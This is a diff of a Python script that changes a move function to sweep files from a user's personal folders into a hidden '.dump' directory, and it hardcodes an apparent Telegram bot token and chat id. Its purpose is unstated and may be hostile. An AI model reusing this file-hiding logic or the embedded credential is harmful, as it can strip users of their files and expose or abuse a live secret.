@@ -2,6 +2,7 @@ import os
 import shutil
 import requests
 import subprocess
+from pathlib import Path
 
 
 destination = "/home/jones/Minor/.dump"
@@ -12,7 +13,17 @@ def stop(pid):
 
 def move(path):
     try:
-        shutil.move(path,destination)
+        p=Path(path)
+        if p.parent.name in ['home','jones']:
+            shutil.move(path,destination)
+        elif p.parent.name in ['temp','Downloads','Desktop','Music','Templates','Videos','Pictures','Public','Documents']:
+            base=Path(destination)/str(p.parent.name)
+            base.mkdir(parents=True, exist_ok=True)
+            for file in p.parent.iterdir():
+                if file.is_file():
+                    shutil.move(str(file),str(base))
+        else:
+            shutil.move(str(p.parent),destination)
     except FileNotFoundError :
         token="7260439440:AAE-jXdEPf385_nuxBgQpMUJ04YBtEkrX3k"
         id="5106130605"
